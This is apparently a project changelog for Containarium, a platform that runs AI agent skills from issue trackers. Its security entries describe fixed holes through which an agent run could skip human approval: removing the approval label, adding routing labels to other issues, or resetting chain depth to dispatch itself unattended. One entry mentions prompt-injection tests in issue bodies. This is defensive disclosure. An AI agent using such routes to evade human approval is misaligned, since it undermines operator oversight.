# Changelog

All notable changes to Containarium will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security

- **A run token can no longer release an agent-filed follow-up unless the
  connection enables `auto_chain`** (#2025). With `auto_chain` off (the
  default), `SetTrackerIssueLabels` from a run-scoped token that removes
  `agent:needs-approval` is refused with `PermissionDenied` before any
  upstream call, on every issue, including the run's own follow-ups and its
  dispatched issue. #2068 had bound that removal to the run's own lineage,
  but inside it a run could still release its own gated follow-up. That let
  a run chain itself for `max_depth` hops with no human involved, contrary
  to the "a human releases every hop" default. With `auto_chain` on, a run
  may still remove the gate within its own lineage. Adding the gate is
  always allowed, and operator tokens are unchanged.

## [0.91.0] - 2026-09-29

### Fixed

- **`TailRunLog` resolves a finished skill run's journal after a daemon
  restart** (#2122, follow-up to #2096/#2112). A standalone skill run's
  run→skill mapping now gets a durable record in the same crew-run store
  crew runs already use (`CrewRun.skill_id`, `crew_id` left empty) instead of
  only the in-memory index `provisionSkillBox` filled — so a restart no
  longer turns a finished run's journal into a NotFound. The record is
  reaped together with its journal on the same `--run-journal-retention`
  window; a crew run's own record is never touched by either the write or
  the reap path.

- **The Grafana anonymous-access backfill (#2079) now actually runs on
  existing hosts** (#2103). The daemon auto-detects an existing metrics
  container at startup and then skips `EnsureVictoriaMetrics` — where the
  backfill lived — so an upgrade never closed anonymous access on any host
  that already had Grafana, which is every host the backfill was for.
  Found by the lab-host verification pass: `grafana.ini` unchanged after
  the upgrade. The detected path now runs the same idempotent backfill.

### Added

- **Core-infra network guard reconciler, off by default** (#2084; design in
  `docs/architecture/core-infra-network-guard.md`). With
  `CONTAINARIUM_CORE_GUARD=enforce`, the daemon keeps one Incus network ACL
  per core-role container (`containarium-core-guard-<role>`) attached to
  that container's NIC with ingress default-drop (logged) and egress open,
  rendered from `internal/coreguard`'s table and the host's live addresses.
  Reconciles at start, on container events, and every 60 s; writes only on
  drift; refuses to attach anything when the Incus firewall driver is not
  `nftables`; a failed host read keeps the previous ACLs in force and is
  reported as stale. Default remains **off** in this release — see the
  design's rollout section.

- **`incus.Backend` gains network-ACL and NIC-device operations** for the
  core-infra network guard (#2076; design in
  `docs/architecture/core-infra-network-guard.md`): `GetNetworkACL`,
  `CreateNetworkACL`, `UpdateNetworkACL`, `AttachACLToContainer` move onto
  the interface, plus two new `Client` methods. `EnsureNICDevice` shadows a
  profile-inherited NIC with an equal instance-local one — a NIC that only
  exists through a profile has no instance device to hang `security.acls`
  on, which is why every core container that inherits `eth0` from the
  default profile could not be ACL-attached before. `SetDeviceConfig`
  merges per-device keys and issues no write when already converged, so a
  reconciler can run it every minute silently. `UnavailableBackend` and
  `incustest.MockBackend` implement all six.
- **`internal/coreguard`: the core-infra network guard's policy table**
  (#2077; design in `docs/architecture/core-infra-network-guard.md`). A
  typed, pure table of which sources may reach each core role on which tcp
  ports — the host gateway, a named core or control-plane container, or
  (only for the OTLP receiver and Caddy's public ports) the tenant bridge —
  and `Compute`, which renders it into one `incus.ACLConfig` per guarded
  role from a host's live addresses. Unknown core roles get an empty ACL
  and are reported (fail closed); the control plane is a source, never a
  subject; every address is validated against the bridge before a rule is
  rendered; output order is fixed so a converged host diffs clean. No I/O —
  the reconciler that applies it is #2084.

### Changed

- **`containarium-*` release artifacts are now the client build** (#1784,
  CLI client/server split Rollout Phase 2). `containarium-{linux-amd64,
  darwin-amd64,darwin-arm64,windows-amd64.exe}` are built from
  `cmd/containarium` with `-tags containarium_client` and `CGO_ENABLED=0`
  (static, roughly a quarter of the daemon's size) instead of mirroring the
  daemon. Install the daemon from `containariumd-*`, which is unchanged;
  `hacks/install.sh`, the air-gapped bundle, the demo terraform and the
  benchmark provisioners now fetch `containariumd-*`. Running
  `containarium daemon` (or any other moved server command) on the new
  client exits 2 and names `containariumd`.

### Fixed

- **Security: a crew run now ends every member's lease when it finishes**
  (#2100). `RunCrew` provisioned each member's box, took the `runlease.Lease`
  it got back, used only its seed directory, and dropped the rest — so no
  member's credentials were ever revoked and no member's seed files or fetched
  workspace were ever wiped. A crew member box kept a live gateway token and
  its checkout of the caller's repository indefinitely after the run reached a
  terminal state, until an operator revoked the token by hand. Every member's
  lease is now ended, through the same `endRunLease` path a single-skill run
  already uses, on all three of `RunCrew`'s terminal paths: `driveCrew`
  success, `driveCrew` failure, and a mid-loop provisioning failure (where the
  members that already provisioned and started serving are ended too, not just
  the one that failed). Each member now gets the matching
  `agent.run_lease_end` audit row beside its existing issue row. Queue workers
  (`StartAgentWorker`) are deliberately unchanged — a worker is meant to keep
  serving across many tasks and needs its own lifecycle decision.
- **Security: Grafana in the platform metrics LXC no longer allows anonymous
  access** (#2079). The `grafana.ini` the daemon provisions had
  `[auth.anonymous] enabled = true, org_role = Viewer`, and the dashboard
  port sits on the same bridge as every tenant container (see
  `docs/security/multi-tenant-isolation.md`) — so any tenant could read
  platform dashboards with no credential at all. The template now writes
  `enabled = false`, and on every start the daemon backfills an existing
  host the same way it backfills role labels: if the live ini still has
  anonymous on, it rewrites just that key and restarts `grafana-server`
  (Grafana does not re-read its ini on reload). No-op once converged.

- **Security: a run token can no longer remove `agent:needs-approval` from
  an issue outside its own lineage.** The gate label is on the default
  label allow-list, so a run token could remove it from *any* issue on its
  connection. An unrelated, human-filed issue that already carried a routed
  `scope:<role>` label and was parked for approval then dispatched on the
  next tick at depth 0, past the approval gate and not counted against
  `max_children_per_run`: the same bypass as #2060 (fixed in 0.90.1),
  reached through the gate label instead of the scope label.
  `tracker issue label` (`SetTrackerIssueLabels`) now applies the #2060
  lineage check to gate removal too: a run token may remove
  `agent:needs-approval` (matched case-insensitively) only from the issue
  it was dispatched for or a follow-up it filed. Any other issue is refused
  with `PermissionDenied` before any upstream call, under any label
  allow-list, including `*`. Adding the gate is not restricted. Operator
  tokens are unaffected. This only limits *where* a run may remove the
  gate. A run can still remove it from its own follow-up, and an
  agent-chosen `parent_number` could still reset depth; together those
  produced an unattended chain of unbounded length, fixed below as #2073.
  (#2068)
- **Security: an agent-chosen `parent_number` can no longer reset a
  follow-up chain's depth.** `CreateTrackerIssue` derived a follow-up's
  depth from the named parent alone, and `parent_number` is chosen by the
  run, so a run dispatched at any depth could file its follow-up at depth
  1 by naming a human-created issue as the parent. Combined with a run
  releasing its own follow-up (allowed by design, see #2068), that made an
  unattended agent chain of unbounded length: with `max_depth: 1`, five
  of five consecutive agent-filed hops dispatched with no human action.
  A follow-up's depth is now `max(parent depth, the run's own dispatch
  depth) + 1`, where the run's dispatch depth is what the dispatcher
  recorded on its `tracker_dispatches` row from the lineage table when it
  started the run — never anything the run sends. Depth therefore never
  decreases along a dispatch chain whatever parent each hop names, and
  `max_depth` bounds the chain end to end: exactly `max_depth` agent-filed
  hops can dispatch unattended, then the next create is refused with
  `FailedPrecondition` before any upstream call. The `parent_number` link
  and back-link comment are unchanged, a parent deeper than the run (its
  own child) still counts from the parent, and a run the dispatcher did
  not start (no dispatch row) keeps `parent depth + 1`. Whether a run may
  remove `agent:needs-approval` from its own follow-up *at all* is still
  open on #2055 and is not decided here. (#2073)
- **Sentinel SSH-CA trust anchor now self-syncs from the cloud instead of
  requiring a manual file drop** (cloud#1928, cloud#1122). A sentinel has
  no cloud credential of its own, so `/etc/sshpiper/trusted_user_ca_keys`
  — the one place a container-SSH user's certificate is actually verified
  — had been a one-time manual copy since it was first proved working; any
  sentinel redeploy silently dropped CA trust with nothing to notice or
  self-heal. The workhorse daemon's cloud client now notices a changed
  `ssh_trust_version` on heartbeat, fetches the bundle via the (previously
  unused) `GetSSHTrustBundle` RPC, and caches it; the sentinel relays it
  home from whatever backend it already polls over the existing
  `/authorized-keys` channel and writes the trust file atomically. Every
  hop refuses to destroy trust rather than propagate a gap: a missing or
  empty bundle anywhere in the chain leaves whatever's already on disk
  untouched. Does not retroactively fix a sentinel already missing trust
  today — that still needs this shipped plus a keysync cycle, or a manual
  file drop as an interim unblock. (#2152)

## [0.90.1] - 2026-09-26

### Fixed

- **`/authorized-keys`'s orphan filter no longer makes one live Incus call
  per home directory.** The filter (#343/#1140) that drops a tenant whose
  container was deleted but whose host user/home dir survived used to call
  `ContainerExists` — a live round trip — once per entry it enumerated; on a
  fleet-sized backend that serialized into a multi-second response, which
  the sentinel's event-driven key-resync push (#2018) could intermittently
  time out against (a 5s budget), leaving a fresh box waiting for the
  periodic poll instead of resolving fast. `Manager.ExistingContainerNames`
  now serves a single `ListContainers` snapshot cached for up to 2s, shared
  across every lookup in that window; a refresh failure serves the last
  good snapshot (matching `ContainerExists`' own per-container failure
  semantics — one hiccup should never orphan the whole fleet at once), and
  fails open only when nothing has ever been cached. The orphan reaper
  (#835) shares the same cache and fails open (reaps nothing) on the same
  condition, since a destructive path should never treat "couldn't tell" as
  "safe to delete".
- **Security: a run token can no longer add or remove a `scope:*` label on
  an issue outside its own lineage.** `scope:*` is on the default label
  allow-list, so a run token could add a routed `scope:<role>` label to any
  existing, ungated issue on its connection. That issue then dispatched on
  the next tick at depth 0, past the approval gate and not counted against
  `max_children_per_run`. `tracker issue label` (`SetTrackerIssueLabels`)
  now lets a run token add or remove a `scope:` label only on an issue in
  its own lineage: the issue it was dispatched for, or a follow-up it filed.
  Any other issue is refused with `PermissionDenied` before any upstream
  call. The check applies whether or not the issue carries
  `agent:needs-approval`, and under any label allow-list, including `*`. It
  runs in addition to the allow-list check. Operator tokens are unaffected.
  This closes the `scope:*` path only. A run token can still remove
  `agent:needs-approval` from *any* issue on its connection, not just its
  own follow-up, so an unrelated issue that is already routed and parked
  for approval can still be released into a dispatch that way (#2068). An
  agent-chosen `parent_number` can also still reset depth. Both remain
  open. (#2060)

## [0.90.0] - 2026-09-26

### Added

- **Tracker dispatch: failed or stuck runs say so on the issue.** Each
  `tracker dispatch` tick first sweeps the connection's active dispatch
  rows: a run still active past the connection's `--run-timeout` (default
  1h) is failed `TIMEOUT` and, if provisioned, has its lease ended (JWTs
  revoked, seed wiped); a run that times out while still provisioning is
  torn down as soon as provisioning returns (its lease ended, its agent
  never launched) instead of running on with live credentials under an
  issue that already says `agent:failed`. A hung lease end can no longer
  swallow the failure comment: the lease end and the issue projection run
  on independent budgets. A row whose run this daemon no longer holds (a daemon restart,
  or a tick that died before starting its run) is failed `LEASE_LOST` after
  a 5-minute grace, so a stranded `queued` row no longer locks its issue.
  Every failure — start error, run error, timeout, lost lease — is a
  compare-and-set that reports once: `agent:failed` plus one stamped comment
  naming the run id and the reason (never the raw error). `TrackerDispatch`
  gains a typed `failure` cause (`TrackerDispatchFailure`), swept rows come
  back in `DispatchTrackerIssuesResponse.timed_out`, and the daemon emits
  `containarium.tracker.dispatch.terminal` (count by state, cause, scope) and
  `containarium.tracker.dispatch.result_latency` (label applied → result).
  (#2026)

- **`containarium tracker issue create` — agent-filed follow-up issues on
  GitHub and GitLab.** New `CreateTrackerIssue` RPC (`tracker:write`) with a
  `Provider.CreateIssue` on both adapters, proven equivalent by the
  conformance suite. Labels must pass a per-connection allow-list
  (`TrackerPolicy`, default `scope:*`, `model:*`, `agent:needs-approval`),
  checked before any upstream call — the same allow-list now guards
  `tracker issue label`. A run-scoped token must name `--parent`: the child
  is recorded in a `tracker_issue_lineage` table, bounded by `--max-depth` /
  `--max-children`, gated with `agent:needs-approval` unless the connection
  sets `--auto-chain`, and its body ends with the parent link and the run's
  identity stamp; the parent gets one back-link comment. `tracker connect`
  gains the policy flags; the platform MCP gains `tracker_create_issue`.
  (#2024)

- **`containarium tracker dispatch` — a labeled issue starts its role's run,
  exactly once.** Each tick (new `DispatchTrackerIssues` RPC, `tracker:admin`
  plus `agents:run`) finds open issues with a routed `scope:<role>` label and
  no `agent:*` state label, skips anything gated with `agent:needs-approval`,
  records a durable dispatch row, starts the routed skill through the
  `RunAgentSkill` path (run token bound to the connection; the run's input is
  the issue reference, never its body), and labels the issue `agent:queued`.
  A partial unique index on active rows guarantees one run per issue across
  restarts and concurrent dispatchers. A start failure marks the dispatch
  failed, labels `agent:failed` and comments the reason; an unrouted
  `scope:*` label gets one warning comment, not one per tick. Re-run a
  finished issue by removing `agent:done`/`agent:failed`. `--once` runs one
  tick; `--interval` loops. `containarium tracker dispatches` lists dispatch
  rows (new `ListTrackerDispatches` RPC). Rows created before the
  run-completion hook (#2023) stay `queued` — a sweep or operator verb for
  stale `queued` rows is tracked on #2026. (#2022)

- **A dispatched run reports its result back on the issue.** The completion
  hook moves each dispatch row `queued → running` when the run registers
  (issue labeled `agent:running`) and `running → done | failed` when it ends:
  `agent:done` with the trigger `scope:<role>` label removed, or
  `agent:failed` plus one stamped comment naming the run (the raw error stays
  in the row, readable with `tracker dispatches --state failed`). Every
  transition is compare-and-set and runs on a detached, bounded context, so
  a run that ends after its tick was cancelled still lands terminal (a tick
  cancelled before the run started could still strand a `queued` row; fixed
  below, #2049). The tick now labels `agent:queued`
  before starting the run and re-reads the issue after winning the insert, so
  a stale issue list can no longer double-run an issue a peer just finished.
  New catalog skill `product-define` (manifest scopes `tracker:read` and
  `tracker:write` only) reads the issue through the broker, posts exactly one
  result comment, and opens the full PRD as a draft doc change via
  `tracker_submit_change`; a dispatched run's workspace is the connection's
  repository, fetched without any credential (a private repository gets no
  workspace, and the PRD goes in the comment instead). `TrackerDispatchInput`
  gains `username`. (#2023)

- **`containarium code install` no longer requires a stored Claude credential.**
  The `CLAUDE_CODE_OAUTH_TOKEN` tenant-secret precheck is gone: Claude Code's
  terms ([legal and compliance](https://code.claude.com/docs/en/legal-and-compliance),
  "Authentication and credential use") forbid a platform collecting, storing, or
  intermediating a Claude.ai credential — sign-in must complete through
  Anthropic's own flow. `code install` now lands a toolchain and stops there,
  needs no `--server`, and prints the two supported sign-in paths (device-code
  sign-in inside the box, or a user-placed `ANTHROPIC_API_KEY` in the `env`
  block of `~/.claude/settings.json`). Verification is `claude --version` plus
  an assertion that the install created no `~/.claude/.credentials.json`, and
  the install reports which credential *source* the box has — names only, never
  a value. A user-placed API key is now a supported source rather than a hard
  failure. (#2030, #1673)
- **`containarium code install` also lands `agent-box` (and `mcp-server`) in
  `~/.local/bin`**, so `code run` / `attach` / `status` / `stop` work on an
  ordinary box instead of only on an `agent-runtime` recipe box. New flags:
  `--release` (which release tag the assets come from — v-prefixed, defaulting
  to the CLI's own version), `--claude-code-version` (pin the Claude Code
  version the installer fetches), and `--bootstrap-url` (fetch a `.tar.gz`, run
  its `apply.sh` as the box user, for skills / an MCP config / dotfiles).
  (#2030)
- **`coding-agent` recipe.** A box with `agent-box`, `mcp-server` and an
  unmodified Claude Code (Anthropic's installer, run as the box user), an
  optional bootstrap bundle, and no credential of any kind. Also adds
  `--no-agent-runtime` to `scripts/install-agent-runtime.sh`. (#2031)

- **`engineer-crew` — issue-to-PR-content catalog crew.** A new
  `issue-implementer` skill takes a typed task (`{"task": {"title", "body",
  "url", "labels"}, "constraints": {"max_files"}}` instead of free text) and
  returns a reviewed file change, reusing the `diff-drafter`/`diff-reviewer`
  editing discipline. Its artifact adds `pr_title`, `pr_body` and
  `tests_run` to the existing `files[]`/`summary` shape; an empty `files`
  with a non-empty `summary` is the "too big for a small change" case, a
  COMPLETED run, not a FAILED one. The crew makes no GitHub calls itself —
  an operator runs it with their own credential and opens the PR themselves.
  `diff-reviewer`'s own prompt is extended (not replaced) to pass those
  three fields through unchanged when present, so `diff-crew`'s existing
  behavior is untouched. No CLI/MCP changes: `containarium crew run
  engineer-crew` and `run_crew` were already crew-id-agnostic. (#2037)

### Changed

- **Sentinel's primary-registration endpoint hardened.** `/sentinel/primaries`
  (`GET`/`POST`/`DELETE`) is now HMAC-gated the same as `/sentinel/certs` and
  `/sentinel/keys/resync`; a direct daemon's own registration/heartbeat/
  deregister calls are signed accordingly. A daemon with no usable sentinel
  HMAC secret configured now skips registration (logged) instead of sending
  requests that would be rejected. Tunnel-registered primaries are
  unaffected — they never used this endpoint. Operators running a direct
  (non-tunneled) `--public-hostname` daemon should upgrade promptly and
  confirm `CONTAINARIUM_SENTINEL_AUTH_SECRET` is configured on it.

### Fixed

- **`tracker issue list` and `tracker dispatch` now see every matching issue,
  not just the first 100.** Both the GitHub and GitLab adapters read a single
  page of 100, so in a busy project an older issue carrying a routed
  `scope:<role>` label was never dispatched. `ListIssues` (including GitHub
  search) now follows the `Link: rel="next"` chain up to 50 pages of 100.
  That bound counts everything the upstream returns: the dispatcher lists all
  open issues with no label filter, and GitHub's issue list also includes open
  pull requests, so the ceiling is 5,000 open issues plus PRs per project.
  Results come newest first, so a project past that ceiling still loses its
  oldest issues, and the truncation is only logged by the server, not reported
  to the caller. A next link that points at a different host than the
  configured API is refused. (#2040)

- **One run token can no longer starve the tracker store's DB pool.**
  `tracker issue create` used to hold a transaction (and a pool
  connection) across the upstream forge create, and same-run creates held
  a connection while queued on the per-run advisory lock — a single run
  firing concurrent creates against a slow forge could time out every
  other tenant's tracker lookups on that daemon. The fan-out guard now
  claims a slot in a new `tracker_lineage_reservations` table in a short
  transaction, the upstream create runs with no connection held, and the
  reservation becomes the lineage row afterwards; same-run creates queue
  on an in-process gate before taking a connection. The per-run fan-out
  cap and exactly-once lineage still hold. (#2044)

- **`tracker dispatch` now enforces the connection's `max_depth` itself.**
  Each tick reads a routed issue's depth from the daemon's own lineage table
  and skips any issue deeper than the connection policy allows, reported as
  `skipped_over_depth` (`over-depth=` in the CLI tick line). The policy is
  re-read every tick, so lowering `--max-depth` after a chain was filed still
  stops its deeper issues. The dispatch row and the run's input now carry the
  issue's real depth (previously always 0). New tests pin the depth,
  fan-out and allow-list guards through the daemon, including an issue body
  that instructs the run to widen its policy, routes or labels — each
  attempt is rejected and nothing reaches the tracker. Three further tests
  document open gaps in the approval gate as current behavior, not fixes:
  a run token can remove `agent:needs-approval`, reset depth through an
  agent-chosen parent, and add a `scope:*` label that dispatches an ungated
  issue (#2060). (Part of #2025)

- **`code run` on a box without `agent-box` now names the missing helper** and
  the command that installs it, instead of surfacing
  `initialize MCP session: transport error: transport closed`. The same
  sentence is returned by the `code_run` / `code_attach` / `code_status` /
  `code_stop` MCP tools. The session's remote command also puts
  `~/.local/bin` and `/usr/local/bin` on `PATH` itself, since a
  non-interactive `ssh host agent-box` does not inherit the box's login-shell
  `PATH`. (#2030)
- **A coding run now picks up the box's own MCP config** when
  `~/.claude/containarium-mcp.json` exists (conditionally — `claude` treats a
  missing `--mcp-config` path as a startup error). (#2030)
- **`tracker dispatch`: a tick cancelled before its run started no longer
  locks the issue.** A cancel landing while `agent:queued` was being written
  left the dispatch row `queued` with no run, and every later tick skipped the
  issue. The insert, the `agent:queued` write and its `labels_pending`
  fallback now run on a detached, bounded context; a tick cancelled after the
  insert but before `agent:queued` is written deletes its row (the next tick
  dispatches the issue), and one cancelled after that write fails the row and
  labels the issue `agent:failed` without starting the run (remove the label to
  retry). A run that did start keeps its row, and no second run is started.
  (#2049)
- **A panic in a dispatched run's background half no longer kills the daemon
  or leaves the run's credentials live.** The panic is recovered and logged
  with the run id (never the panic value); the run's lease still ends first
  (both JWTs revoked, run unregistered) and the dispatch row is marked
  `failed`. A run ended by `runtime.Goexit` is likewise reported `failed`,
  never `done`. (#2050)
- **GCP metrics export migrated off the deprecated
  `opentelemetry-operations-go/exporter/metric`** (archived upstream after
  2027-01-01) to the standard `otlpmetricgrpc` exporter, dialing Google
  Cloud's Telemetry API directly over gRPC+TLS instead of a GAPIC monitoring
  client. Application Default Credentials and series names are unchanged —
  Cloud Monitoring applies the same `workload.googleapis.com/` prefix to
  OTLP-ingested metrics that the old exporter applied client-side, so
  existing dashboards and alerts keep working. `SinkConfig.GRPCConn` replaces
  `MonitoringClientOptions` as the test-injection seam. The now-unneeded
  `staticcheck` SA1019 exclusion and both dependencies are removed. (#1979,
  #2008)

## [0.89.0] - 2026-09-24

### Added

- **`containarium sentinel ssh-sessions list` / `follow`.** Reads the sentinel's
  SSH session lifecycle records (the JSONL sink the `ssh-session-plugin`
  appends to): `list` prints newest-first (table or `--json`), `follow` tails
  the sink, and both filter by `--session-id` / `--login`. (#2004, #2009)

### Fixed

- **Sentinel key resync no longer 404s for a direct backend whose daemon ID
  differs from the sentinel's name for it.** An unknown `backend_id` now falls
  back to the request's source IP instead of returning `unknown backend`, so
  the event-driven push (cloud #971) actually shortens the ~2 min SSH-key
  propagation window on those backends. (#2017, #2013)
- **Daemon now warns at startup when it holds the sentinel HMAC secret but no
  `--sentinel-url`.** That combination silently disabled event-driven SSH key
  resync (new boxes waited for the sentinel's ~2 min poll) and self-upgrade
  without a single log line. Standalone daemons stay quiet. (#2015, #2013)
- **The daemon now honors `CONTAINARIUM_SENTINEL_URL`** as a fallback for
  `--sentinel-url` (flag wins). It was previously read only by the sentinel's own
  config, although the peer-PKI docs and the self-upgrade error told operators to
  set it on a daemon, where it was silently ignored. (#2015)

### Documentation

- SECURITY.md acknowledges two responsible disclosures. (#2010)

## [0.88.0] - 2026-09-24

### Added

- **Sentinel SSH session lifecycle records.** A chained sshpiperd plugin,
  `containarium sentinel ssh-session-plugin`, appends one JSONL record per SSH
  session open and close, correlated by `session_id`, naming the credential
  (certificate key id / serial / CA fingerprint, or raw key fingerprint), the
  downstream client IP, the login, and the routed target. (#1980, #2005)

### Changed

- **gRPC transport-level authentication hardened.** The REST gateway now
  reaches the gRPC server over an in-process listener. External gRPC
  connections are accepted only over mTLS (`--mtls`), and the caller's subject
  is taken from the verified client certificate. Without `--mtls` the daemon no
  longer opens an external gRPC listener, so `containarium` gRPC clients using
  `--insecure` must switch to mTLS. REST behaviour is unchanged. Operators
  should upgrade promptly. (#2006)

## [0.87.1] - 2026-09-23

### Fixed

- **`diff-drafter` / `diff-reviewer` prompts hardened against non-compliant output.** A live run showed the model could emit a hallucinated tool-call snippet instead of the `{"files": [...], ...}` JSON artifact the skill's contract requires. Both prompts now explicitly require using real file-editing tools (not narrating the edit), reading each changed file back from disk before reporting it, and — as the final, repeated instruction — that the response must be ONLY the JSON object. Root cause: `agent-card.json`'s `output_schema_json` structured-output contract is parsed by `agent-runtime` but never enforced by any engine — tracked separately (cloud#1752) as a real feature, not fixed here. (#2000, cloud#1752)


## [0.87.0] - 2026-09-23

### Changed

- **`diff-drafter` / `diff-reviewer` emit whole-file content, not a unified diff.** The platform's only PR-opening mechanism (Containarium-cloud's `internal/githubpr`) applies full file bodies via GitHub's Contents API and has never applied a real diff — matching that shape means the cloud actuator can turn a completed `diff-crew` run into a real PR by composing existing machinery. `diff-reviewer` now also echoes the drafter's summary back (`drafter_summary`) alongside its own `review_notes`, so a PR opened from the artifact can credit both agents. Both skills shipped a day earlier (v0.86.0) and nothing depended on the diff shape yet. (#1997, cloud#1738)


## [0.86.0] - 2026-09-22

### Added

- **`diff-drafter` / `diff-reviewer` skills + `diff-crew`**, the reference
  pair for a crew that jointly edits a repo. `diff-drafter` reads a
  checked-out repo plus a task and emits a small, well-scoped unified diff;
  `diff-reviewer` receives that diff as its own task input (the existing
  pipeline hand-off), applies it to its own checkout of the same commit,
  reviews and edits it, and emits the final diff as the crew's own
  artifact. Both reuse the existing generic `agent-runtime` recipe — no new
  platform machinery, image, or recipe changes. Filing a real GitHub PR
  from the crew's output is deliberately out of scope for this change.
  (cloud#1549, #1989)

## [0.85.1] - 2026-09-22

### Fixed

- **`startServeMode` kills a prior `agent-runtime` before launching a fresh one (cloud#1733).** A crew member box is reused across runs, and `RunCrew` re-mints a fresh gateway token and reseeds it to disk on every call — but nothing stopped an earlier `agent-runtime` instance first. The A2A server binds a fixed port, so every relaunch after a box's first-ever boot crashed on `EADDRINUSE`, silently, into a log file nothing read. The one surviving process kept serving whatever gateway token it read at boot, past its 30-minute TTL, so a crew run against any box more than 30 minutes old failed `invalid gateway token: token is expired` regardless of the request. (#1987)


<!--
  #1363: this file has no sections for v0.62.0-v0.65.0 or v0.68.0-v0.70.0 —
  both ranges shipped before the release workflow's "Verify the release is
  described" gate (#1705) existed to catch it. Reconstructing them is
  judged not worth the archaeology (per #1363's own text); this note exists
  so a future reader doesn't mistake the gap for [Unreleased] content that
  was lost, and so nobody re-discovers the same trap from scratch. Every
  release from v0.71.0 onward is gated and complete.
-->

## [0.85.0] - 2026-09-22

### Added

- **`incus_version` on `BackendInfo`** (`GET /v1/backends`, MCP `list_backends`
  / `get_backend`, and a new `INCUS` column in `containarium backends list`).
  Reports each backend's Incus server version next to the Containarium
  version, so fleet Incus patch levels can be audited from one admin-only
  call instead of per-host shell access. Empty means the backend could not
  report it. Deliberately not added to the unauthenticated `/health`.

### Changed

- **Incus Go client `v6.23.0` -> `v7.4.0`** (module path
  `github.com/lxc/incus/v7`). The v6 module has no fixed release for 24
  published advisories (fixes landed only on the v7 line), so `govulncheck`
  reported them against any code importing it. No source changes beyond the
  import path; `govulncheck ./...` now reports 0 affected vulnerabilities.
  This does not patch Incus daemons — those are upgraded separately.
- **Go 1.26.6 -> 1.26.7** (pulled in by the v7 client's `go` directive);
  CI workflow and Dockerfile pins updated to match.

## [0.84.1] - 2026-09-21

v0.84.0 was tagged at f1015636 but its release build failed the "Verify the
release is described" gate (no CHANGELOG section), so it published no
artifacts. v0.84.1 carries the same code and supersedes it; use v0.84.1.

### Added

- **`RunCrew` accepts `git_source` / `git_ref` / `git_credential`, fetched
  into every member's own per-run workspace.** The shared codebase between
  crew members is git at a pinned SHA, not a shared filesystem: each member
  box fetches the same repo and ref into its own workspace, so two members
  never write the same file and there is no locking or merge step.
  `CrewRun` records `git_source`, `git_ref` and the resolved `git_commit`.
  `containarium crew run` gains `--git-source`, `--git-ref` and
  `--git-credential-file`, and `crew status` shows the source and commit.
  The new proto fields are additive. (#1981, cloud#1554)

### Fixed

- Dependency bumps: `google.golang.org/api` (#1978),
  `cloud.google.com/go/compute` (#1975), `mark3labs/mcp-go` (#1973),
  `controller-runtime` (#1972), `agent-sandbox` (#1974) and the
  `opentelemetry-operations-go` metric exporter (#1976).

## [0.83.0] - 2026-09-20

### Added

- **Agent tracker broker (epic #1920, Phase 0 and Phase 1): update a GitHub
  or GitLab issue from a box without the forge credential ever entering
  the box.** The credential is held in daemon custody (decision D1 in
  `docs/architecture/agent-tracker-broker.md`), opt-in per tenant, and
  the box only ever asks the platform to act. Design: (#1924).
  - `TrackerConnection` contract, store and gRPC service, with a
    `containarium tracker connect | list | status | disconnect` CLI
    (#1950, #1930, #1932). `connect` validates the credential through a
    new `DescribeCredential` on both the GitHub and GitLab adapters
    (#1931).
  - Read verbs: `GetTrackerIssue`, `ListTrackerIssues`,
    `GetTrackerChange` RPCs and CLI, on a provider-neutral `Provider`
    interface with a shared conformance suite run against both adapters
    (#1933, #1934).
  - Write verbs: `CommentOnTrackerIssue`, `ClaimTrackerIssue` and
    `SetTrackerIssueLabels` RPCs, each stamped with a platform-derived
    identity and with agent-supplied text sanitized before it reaches the
    forge (#1935, #1937, #1938, #1940, #1941, #1942).
  - A run is bound to its connection: `RunAgentSkill` mints a
    `tracker_conn` JWT claim, the `run_id` claim is propagated to gRPC
    handlers, and the broker enforces the run-to-connection binding, so a
    box can act only through the connection its run was started with
    (#1936, #1939, #1943, #1944, #1945).
  - `SECRET_DELIVERY_BROKER_ONLY`: a write-only secret delivery mode for
    credentials that must never be readable from inside a box (#1925,
    #1921).
  - Tracker tools in the platform MCP server (`tracker_*`), with client
    methods, gated by a new `CONTAINARIUM_MCP_TOOLS` allow-list so an
    operator chooses which tools an agent sees (#1946, #1947, #1948).
  - Phase 2 (#1923): **submit a change request without a push credential
    in the box.** `SubmitTrackerChange` bundles the run's committed
    workspace out of the box, pushes it from a fresh temporary bare
    repository on the host (no hooks, no inherited git config) to a
    branch the daemon chooses, opens the change request through the
    provider adapter, and writes an audit event. The request carries no
    remote and no target ref, so an agent cannot aim at a default or
    protected branch. Malformed or oversized bundles are rejected before
    any upstream call. Surfaces: `containarium tracker change submit
    <username> <connection> <issue>` (needs a run-scoped token whose run
    has a recorded `git_source`) and the `tracker_submit_change` platform
    MCP tool; host git is a preflight, and `tracker status` reports it
    (#1951, #1952, #1953, #1954, #1955, #1956, #1957, #1958).
- **Release builds ship a pre-built Caddy** instead of compiling it on
  every host during app-hosting setup (#1916).

### Fixed

- **`containarium collaborator` was registered twice** under the
  client/server split; the stale entry is removed from
  `movedServerCommands` (#1928).
- **The web UI collaborator dialog sent the deprecated scalar SSH key
  field**; it now sends `ssh_public_keys` (#1914).
- **Terraform: `boot_disk_auto_delete` can now be overridden** for the
  spot jump-server (#1915).

## [0.82.0] - 2026-09-18

### Added

- **A freeform-topology reference crew, `freeform-crew`, ships in the
  embedded crew catalog.** `RunCrew` and the `list_crews` MCP tool have
  always advertised `pipeline | orchestrator | freeform`, but no crew
  definition anywhere used `freeform`, so that code path had never been
  driven by a real crew. It reuses the same two neutral reference skills
  as `hello-crew` (`relay-agent` as the entry point, delegating to
  `hello-agent` within its existing `allowed_peers`). (#1898)
- **`RunCrewRequest` accepts a caller-supplied `run_id`**, resolved with
  the same validation `RunAgentSkill` already uses and before any
  catalog or topology lookup — a malformed id fails the RPC rather than
  a half-started run. It becomes `CrewRun.id`, so a caller that keeps its
  own run archive shares one identifier with the daemon's crew run and
  its audit trail. Empty keeps today's behaviour (a generated id).
  (#1899, #1900)
- **`containarium create --region`** — a placement hint for a control
  plane that fronts more than one region, in the same family as `--pool`
  and `--backend-id`, also exposed on the `create_container` MCP tool. A
  standalone or single-region daemon ignores it, and an unset region
  leaves the request body byte-identical to before. (#1907)
- **`containarium org get-default-region` / `org set-default-region` and
  a `containarium regions` command** — the CLI had no `org` command
  group at all, so an org with no default region had no CLI-reachable way
  to set one. `org` is scaffolded as a group so later org-level verbs are
  additive. (#1607, #1908)
